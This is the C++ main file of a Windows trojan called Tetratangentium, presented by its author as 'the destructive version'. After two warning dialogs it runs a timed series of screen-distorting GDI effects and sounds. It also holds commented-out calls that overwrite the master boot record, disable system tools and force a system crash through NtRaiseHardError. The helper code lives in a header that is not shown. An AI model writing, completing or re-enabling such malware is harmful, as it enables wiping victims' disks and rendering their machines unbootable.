#include "Tetratangentium.h"
/* Tetratangentium.exe - A malware by NotCCR
This is the destructive version.
Credits to VenraTech for ALKWEL raster value (I renamed it to NOTMERGEERASE)
Works best on Windows XP */

int WINAPI WinMain(HINSTANCE hinst, HINSTANCE hprevinst, LPSTR cmdline, int cmdshow) {
	if (MessageBoxW(NULL, L"WARNING!\r\n\r\nYou\'re running a trojan horse known as Tetratangentium, that will delete all your data.\r\nBy running this, you\'re 100% responsible for anything done as a result of this malware.\r\nIf you're running this on physical hardware, shut it down quickly!\r\nNotCCR is not responsible for anything.\r\n\r\nStill proceed to execute it?", L"Tetratangentium.exe by NotCCR", MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) == IDNO)
	{
		return 0;
	}
	if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\nNOTCCR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE WITH THIS MALWARE!\r\nRUN THIS ONLY ON A VIRTUAL MACHINE!\r\nEXECUTE IT?", L"Tetratangentium.exe - Final Warning", MB_ICONWARNING|MB_YESNO|MB_DEFBUTTON2) == IDNO)
	{
		return 0;
	}
	/* Destruction::KillMBR();
	Destruction::DisableSystemTools(); */
	MessageBoxW(NULL, L"The process cannot access this file because it is being used by another process.", StrGen(rand() % 20), MB_ICONWARNING|MB_OK);
	Sleep(2000);
//	CreateThread(NULL, 0, error::Critical, NULL, 0, 0);
//	Sleep(3000);
//	CreateThread(NULL, 0, Windows::HideAllWindows, NULL, 0, 0);
	Sleep(2000);
	CreateThread(NULL, 0, GDI::GocullinatorCircle, NULL, 0, 0);
	Sleep(5000);
	/* CreateThread(NULL, 0, Inputs::Mouse, NULL, 0, 0);
	CreateThread(NULL, 0, Inputs::Scroll, NULL, 0, 0); */
	HANDLE hNES = CreateThread(NULL, 0, GDI::noteraseshake, NULL, 0, 0);
	Sound1();
	Sleep(25000);
	EndPayload(hNES);
	InvalidateRect(0, 0, 0);
	Sleep(2000);
	HANDLE hPB = CreateThread(NULL, 0, GDI::plgblt, NULL, 0, 0);
	Sound2();
	Sleep(30000);
	EndPayload(hPB);
	InvalidateRect(0, 0, 0);
	HANDLE hHT = CreateThread(NULL, 0, GDI::HSLTriangles, NULL, 0, 0);
	HANDLE hSS = CreateThread(NULL, 0, GDI::SharpShake, NULL, 0, 0);
	Sound3();
	Sleep(35000);
	EndPayload(hHT); EndPayload(hSS);
	InvalidateRect(0, 0, 0);
	HANDLE hHM = CreateThread(NULL, 0, GDI::HorizontalMelt, NULL, 0, 0);
	HANDLE hBT = CreateThread(NULL, 0, GDI::BouncingTriangle, NULL, 0, 0);
	Sound4();
	Sleep(30000);
	EndPayload(hHM); EndPayload(hBT);
	InvalidateRect(0, 0, 0);
	Sleep(2000);
	HANDLE hPTR = CreateThread(NULL, 0, GDI::PTrgbQuad, NULL, 0, 0);
	HANDLE hWE = CreateThread(NULL, 0, GDI::WhiteEllipses, NULL, 0, 0);
	Sound5();
	Sleep(30000);
	EndPayload(hPTR); EndPayload(hWE);
	InvalidateRect(0, 0, 0);
	HANDLE hRTO = CreateThread(NULL, 0, GDI::RainbowTexts, NULL, 0, 0);
	HANDLE hPHO = CreateThread(NULL, 0, GDI::PatHSLOverdose, NULL, 0, 0);
	HANDLE hCS = CreateThread(NULL, 0, GDI::CirclShake, NULL, 0, 0);
	Sound6();
	Sleep(30000);
	EndPayload(hRTO); EndPayload(hPHO); EndPayload(hCS);
	InvalidateRect(0, 0, 0);
	Sleep(2000);
	HANDLE hPix = CreateThread(NULL, 0, GDI::Pixelator, NULL, 0, 0);
	HANDLE hBCS = CreateThread(NULL, 0, GDI::BounceCirclePoint, NULL, 0, 0);
	Sound7();
	Sleep(30000);
	EndPayload(hPix); EndPayload(hBCS);
	HANDLE hCT = CreateThread(NULL, 0, GDI::CubesTexts, NULL, 0, 0);
	Sound8();
	Sleep(30000);
	EndPayload(hCT);
	Sleep(3000);
	HANDLE hRot = CreateThread(NULL, 0, GDI::Rotation, NULL, 0, 0);
	HANDLE hClR = CreateThread(NULL, 0, GDI::ClrRectangles, NULL, 0, 0);
	HANDLE hSeS = CreateThread(NULL, 0, GDI::SetShake, NULL, 0, 0);
	Sound9();
	Sleep(30000);
	InvalidateRect(0, 0, 0);
	HANDLE hPI = CreateThread(NULL, 0, GDI::PatIcons, NULL, 0, 0);
	Sound10();
	Sleep(30000);
	/* BYTE ntByte;
	DWORD ntResponse;
	RtlAdjustPrivilege(19, true, false, &ntByte);
	NtRaiseHardError(0xc0000010, 0, 0, 0, 6, &ntResponse);
	Sleep(-1); */
}
